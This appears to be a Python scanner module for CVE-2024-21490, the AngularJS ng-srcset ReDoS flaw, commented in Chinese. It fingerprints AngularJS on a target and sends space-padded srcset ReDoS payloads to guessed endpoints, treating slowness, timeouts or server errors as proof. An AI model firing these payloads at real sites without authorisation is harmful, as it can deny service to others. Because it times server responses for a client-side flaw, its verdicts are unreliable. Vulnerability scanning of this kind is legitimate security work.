"""
CVE-2024-21490 Vulnerability Detection Script
AngularJS ng-srcset ReDoS - CVSS 7.5 (High)
HeroDevs Vulnerability Directory
"""

import requests
import time
import re
from urllib.parse import urljoin

def scan(session, target_url):
    """
    掃描 CVE-2024-21490 弱點
    AngularJS ng-srcset 正規表達式拒絕服務攻擊
    影響版本: AngularJS ≥ 1.3.0
    """
    result = {
        'vulnerable': False,
        'evidence': '',
        'description': 'CVE-2024-21490: AngularJS ng-srcset ReDoS 弱點，惡意輸入可導致正規表達式災難性回溯',
        'remediation': '更新到 AngularJS NES 1.9.3 或 1.5.19，避免處理不可信的 srcset 輸入'
    }
    
    try:
        print("      [檢測] 正在檢查 CVE-2024-21490 ng-srcset ReDoS 弱點...")
        
        # 檢測 AngularJS 版本和 ng-srcset 使用
        response = session.get(target_url, timeout=30)
        
        angular_indicators = [
            'angular.js',
            'angular.min.js',
            'ng-app',
            'ng-controller'
        ]
        
        srcset_indicators = [
            'ng-srcset',
            'ngSrcset',
            'ng-attr-srcset',
            'srcset='
        ]
        
        uses_angular = any(indicator in response.text.lower() for indicator in angular_indicators)
        uses_srcset = any(indicator in response.text.lower() for indicator in srcset_indicators)
        
        if not uses_angular:
            result['evidence'] = "未檢測到 AngularJS 應用程式"
            return result
        
        print(f"      [檢測] 發現 AngularJS 應用程式，ng-srcset 使用情況: {'是' if uses_srcset else '否'}")
        
        # 檢查 AngularJS 版本是否受影響
        version_patterns = [
            r'angular\.version\s*=\s*["\']([0-9.]+)',
            r'angular\.js\?v=([0-9.]+)',
            r'AngularJS\s+v([0-9.]+)'
        ]
        
        detected_version = None
        for pattern in version_patterns:
            match = re.search(pattern, response.text)
            if match:
                detected_version = match.group(1)
                print(f"      [檢測] 檢測到 AngularJS 版本: {detected_version}")
                break
        
        # 測試 ng-srcset ReDoS 攻擊
        test_endpoints = [
            '/api/image',
            '/api/upload',
            '/api/responsive',
            '/api/srcset',
            '/upload',
            '/image',
            '/responsive',
            '/media'
        ]
        
        # CVE-2024-21490 特定 ReDoS 攻擊負載
        redos_payloads = [
            {
                'payload': 'http://example.com/image.png 2x,' + ' ' * 1000 + 'http://example.com/image2.png',
                'description': '1000 spaces ReDoS payload',
                'expected_delay': 1.0
            },
            {
                'payload': 'http://example.com/image.png 1x,' + ' ' * 2000 + 'http://example.com/image2.png 2x',
                'description': '2000 spaces ReDoS payload',
                'expected_delay': 5.0
            },
            {
                'payload': 'http://example.com/img.jpg,' + ' ' * 500 + 'http://example.com/img2.jpg 2x,' + ' ' * 500 + 'http://example.com/img3.jpg 3x',
                'description': 'Multiple space groups ReDoS',
                'expected_delay': 2.0
            },
            {
                'payload': 'data:image/jpeg;base64,/9j/4AAQ 480w,' + ' ' * 1500 + 'http://example.com/large.jpg 1920w',
                'description': 'Data URI with spaces ReDoS',
                'expected_delay': 3.0
            }
        ]
        
        for endpoint in test_endpoints:
            try:
                # 測試端點是否存在
                test_response = session.get(urljoin(target_url, endpoint), timeout=15)
                if test_response.status_code == 404:
                    continue
                
                print(f"      [檢測] 測試端點: {endpoint}")
                
                for payload_data in redos_payloads:
                    payload = payload_data['payload']
                    description = payload_data['description']
                    expected_delay = payload_data['expected_delay']
                    
                    try:
                        # 測試 POST 請求的 ReDoS
                        post_data = {
                            'srcset': payload,
                            'ng_srcset': payload,
                            'responsive_images': payload,
                            'image_srcset': payload
                        }
                        
                        print(f"      [檢測] 測試 {description}...")
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            data=post_data,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        print(f"      [檢測] 請求耗時: {duration:.2f} 秒")
                        
                        # 如果回應時間超過預期，可能存在 ReDoS
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 CVE-2024-21490 ng-srcset ReDoS 弱點。{description} 導致請求耗時 {duration:.2f} 秒，超過預期的 {expected_delay} 秒閾值。這表明正規表達式發生了災難性回溯，可能導致拒絕服務攻擊。"
                            return result
                        
                        # 檢查伺服器錯誤回應
                        if response.status_code >= 500:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 ReDoS 導致的伺服器錯誤。{description} 導致 HTTP {response.status_code} 錯誤，請求耗時 {duration:.2f} 秒。"
                            return result
                        
                        # 測試 JSON 格式
                        json_data = {
                            'image': {
                                'srcset': payload
                            },
                            'responsive': {
                                'srcset': payload
                            }
                        }
                        
                        headers = {'Content-Type': 'application/json'}
                        start_time = time.time()
                        
                        response = session.post(
                            urljoin(target_url, endpoint),
                            json=json_data,
                            headers=headers,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 ReDoS 弱點 (JSON 格式)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                        
                        # 測試 GET 參數
                        get_params = {
                            'srcset': payload,
                            'responsive': payload
                        }
                        
                        start_time = time.time()
                        
                        response = session.get(
                            urljoin(target_url, endpoint),
                            params=get_params,
                            timeout=30
                        )
                        
                        end_time = time.time()
                        duration = end_time - start_time
                        
                        if duration > expected_delay:
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 ReDoS 弱點 (GET 參數)。{description} 耗時 {duration:.2f} 秒。"
                            return result
                            
                    except requests.exceptions.Timeout:
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現 ReDoS 弱點。{description} 導致請求逾時，表明發生了災難性回溯。"
                        return result
                    except Exception as e:
                        if "timeout" in str(e).lower():
                            result['vulnerable'] = True
                            result['evidence'] = f"在端點 {endpoint} 發現 ReDoS 弱點。{description} 導致逾時錯誤: {str(e)}"
                            return result
                        continue
                        
            except Exception as e:
                continue
        
        # 分析現有頁面中的 ng-srcset 使用
        print("      [檢測] 分析現有頁面中的 ng-srcset 實作...")
        
        srcset_patterns = [
            r'ng-srcset\s*=\s*["\'][^"\']*["\']',
            r'ng-attr-srcset\s*=\s*["\'][^"\']*["\']',
            r'srcset\s*=\s*["\'][^"\']*["\']'
        ]
        
        found_srcset_usage = []
        for pattern in srcset_patterns:
            matches = re.findall(pattern, response.text, re.IGNORECASE)
            if matches:
                found_srcset_usage.extend(matches)
        
        if found_srcset_usage:
            print(f"      [檢測] 發現 {len(found_srcset_usage)} 個 srcset 相關用法")
            
            # 檢查是否有容易受攻擊的模式
            vulnerable_patterns = []
            for usage in found_srcset_usage:
                # 檢查是否使用了動態內容
                if '{{' in usage and '}}' in usage:
                    vulnerable_patterns.append(usage)
                # 檢查是否已包含多個空格
                elif '  ' in usage:  # 多個連續空格
                    vulnerable_patterns.append(usage)
            
            if vulnerable_patterns:
                print(f"      [檢測] 發現 {len(vulnerable_patterns)} 個潛在易受攻擊的 srcset 用法")
        
        # 測試前端 ng-srcset 處理
        print("      [檢測] 測試前端 ng-srcset 處理...")
        
        # 構造測試頁面來檢測前端 ReDoS
        test_html_payloads = [
            f'<img ng-srcset="{redos_payloads[0]["payload"]}">',
            f'<img ng-attr-srcset="{redos_payloads[1]["payload"]}">',
            f'<picture><source ng-srcset="{redos_payloads[2]["payload"]}"><img src="fallback.jpg"></picture>'
        ]
        
        for payload in test_html_payloads:
            for endpoint in ['/api/content', '/api/template', '/content']:
                try:
                    start_time = time.time()
                    
                    response = session.post(
                        urljoin(target_url, endpoint),
                        data={'content': payload, 'html': payload, 'template': payload},
                        timeout=20
                    )
                    
                    end_time = time.time()
                    duration = end_time - start_time
                    
                    if duration > 2.0:  # 2秒閾值
                        result['vulnerable'] = True
                        result['evidence'] = f"在端點 {endpoint} 發現前端 ng-srcset ReDoS 弱點。HTML 內容處理耗時 {duration:.2f} 秒。"
                        return result
                        
                except requests.exceptions.Timeout:
                    result['vulnerable'] = True
                    result['evidence'] = f"在端點 {endpoint} 發現前端 ReDoS 弱點，HTML 處理導致逾時。"
                    return result
                except:
                    continue
        
        # 檢查 AngularJS 版本特定的弱點
        if detected_version:
            version_parts = detected_version.split('.')
            if len(version_parts) >= 2:
                major = int(version_parts[0])
                minor = int(version_parts[1])
                
                # CVE-2024-21490 影響 AngularJS >= 1.3.0
                if major > 1 or (major == 1 and minor >= 3):
                    print(f"      [檢測] 版本 {detected_version} 可能受 CVE-2024-21490 影響")
                    
                    # 如果發現了 srcset 使用且版本受影響，提高警戒
                    if found_srcset_usage:
                        result['evidence'] += f" 檢測到易受影響的版本 {detected_version} 和 {len(found_srcset_usage)} 個 srcset 用法。"
        
        # 測試簡化的 ReDoS 檢測
        print("      [檢測] 執行簡化 ReDoS 測試...")
        
        simple_redos_test = 'http://example.com/image.png,' + ' ' * 100 + 'http://example.com/image2.png'
        
        try:
            start_time = time.time()
            
            response = session.get(
                target_url,
                params={'test_srcset': simple_redos_test},
                timeout=10
            )
            
            end_time = time.time()
            duration = end_time - start_time
            
            if duration > 1.0:
                result['vulnerable'] = True
                result['evidence'] = f"簡化 ReDoS 測試顯示潛在弱點。基本測試耗時 {duration:.2f} 秒，表明可能存在正規表達式效能問題。"
                return result
                
        except:
            pass
        
        # 檢查 Content Security Policy
        csp_header = response.headers.get('Content-Security-Policy', '')
        if csp_header and 'img-src' in csp_header.lower():
            print("      [檢測] 發現 CSP img-src 限制，可能有助於減輕 ReDoS 影響")
        
        result['evidence'] = f"完成 CVE-2024-21490 檢測。測試了 {len(test_endpoints)} 個端點和 {len(redos_payloads)} 個 ReDoS 負載，分析了 {len(found_srcset_usage)} 個 srcset 用法，未發現明確的 ReDoS 弱點。"
        
    except Exception as e:
        result['evidence'] = f"掃描過程中發生錯誤: {str(e)}"
    
    return result